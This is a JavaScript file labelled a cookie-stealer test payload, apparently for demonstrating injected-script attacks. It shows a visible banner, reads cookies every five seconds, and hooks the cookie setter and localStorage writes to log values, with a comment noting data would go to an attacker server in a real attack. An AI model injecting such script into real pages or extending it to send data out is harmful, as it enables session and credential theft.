// Living Clone - Cookie Stealer Test Payload
// WARNING: For educational purposes only!

(function() {
  'use strict';

  // Visual indicator
  const banner = document.createElement('div');
  banner.innerHTML = `
    <div style="
      position: fixed;
      bottom: 10px;
      right: 10px;
      background: linear-gradient(135deg, #4CAF50, #45a049);
      color: white;
      padding: 15px 20px;
      z-index: 99999;
      border-radius: 8px;
      font-family: 'Segoe UI', monospace;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
      max-width: 300px;
    ">
      🍪 Cookie Monitor Active
      <div style="font-size: 11px; margin-top: 8px; opacity: 0.9;">
        <div>Cookies found: <span id="cookieCount">0</span></div>
        <div id="cookieList" style="margin-top: 5px; max-height: 100px; overflow-y: auto;"></div>
      </div>
    </div>
  `;
  document.body.appendChild(banner);

  // Monitor cookies
  function updateCookieDisplay() {
    const cookies = document.cookie.split(';').map(c => c.trim());
    const countEl = document.getElementById('cookieCount');
    const listEl = document.getElementById('cookieList');
    
    if (countEl) countEl.textContent = cookies.length;
    if (listEl) {
      listEl.innerHTML = cookies.map(c => {
        const name = c.split('=')[0];
        return `<div style="background:rgba(255,255,255,0.2);padding:3px 6px;margin:2px 0;border-radius:3px;font-size:10px;">${name}</div>`;
      }).join('');
    }

    // Log cookies (would send to attacker server in real attack)
    console.log('[CookieStealer] Cookies:', cookies);
    
    return cookies;
  }

  // Initial display
  updateCookieDisplay();

  // Update every 5 seconds
  setInterval(updateCookieDisplay, 5000);

  // Monitor cookie changes
  const originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
  Object.defineProperty(document, 'cookie', {
    get: function() {
      return originalDescriptor.get.call(this);
    },
    set: function(value) {
      console.log('[CookieStealer] Cookie set:', value);
      originalDescriptor.set.call(this, value);
      updateCookieDisplay();
    }
  });

  // Monitor localStorage
  const originalSetItem = localStorage.setItem;
  localStorage.setItem = function(key, value) {
    console.log('[CookieStealer] localStorage set:', key, value);
    originalSetItem.call(this, key, value);
  };

  console.log('[CookieStealer] Cookie monitor active');
})();
